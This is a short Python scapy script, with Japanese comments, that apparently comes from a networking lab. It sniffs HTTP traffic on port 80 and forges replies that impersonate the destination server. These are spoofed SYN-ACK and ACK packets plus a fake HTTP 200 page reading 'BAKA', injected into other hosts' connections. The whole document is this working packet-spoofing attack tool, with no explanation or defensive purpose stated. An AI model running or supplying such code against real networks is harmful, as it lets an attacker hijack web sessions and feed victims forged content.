#! encoding:utf8
from scapy.all import *

IFACE = "enp0s3"
CONTENT= "<html><body><h1>BAKA</h1></body></html>\n"
RESPONSE_HEADER="HTTP/1.1 200 OK\r\nContent-type: text/html\r\nContent-Length: " + str(len(CONTENT)) + "\r\n\r\n" + CONTENT
IPADDR =  "10.0.2.15"

def main():
    # tcp80へのパケットをキャプチャ
    # パケットを受信したら、"prn"で指定された関数を呼び出す
    sniff(filter="tcp and port 80", iface=IFACE, prn=send_spoofing_packet)
    

def send_spoofing_packet(packet):
    ip = packet[IP]
    tcp = packet[TCP]
    send_ip = IP(src=ip.dst, dst=ip.src)
    if packet.sprintf('%TCP.flags%') == "S" :
        print ("receive SYN packet")
        synack = send_ip/TCP(sport=tcp.dport, 
                             dport=tcp.sport,
                             seq=1,
                             ack=tcp.seq + 1,
                             flags="SA"
                            )
        send(synack)
    elif packet.sprintf('%TCP.flags%') == "PA" :
        print ("receive HTTP GET")
        ack = send_ip/TCP(sport=tcp.dport,
                          dport=tcp.sport,
                          flags="A",
                          seq=tcp.ack,
                          ack=tcp.seq + len(tcp.payload)) 
        send(ack)
        http_res = send_ip/TCP(sport=tcp.dport,
                               dport=tcp.sport,
                               flags="A",
                               seq=tcp.ack,
                               ack=tcp.seq + len(tcp.payload))/RESPONSE_HEADER
        send(http_res)
    elif packet.sprintf('%TCP.flags%') == "FA" :
        print ("receive FIN packet")
        ack = send_ip/TCP(sport=tcp.dport,
                          dport=tcp.sport,
                          flags="A",
                          seq=tcp.ack,
                          ack=tcp.seq + 1
                          )
        send(ack)

if __name__ == '__main__':
    main()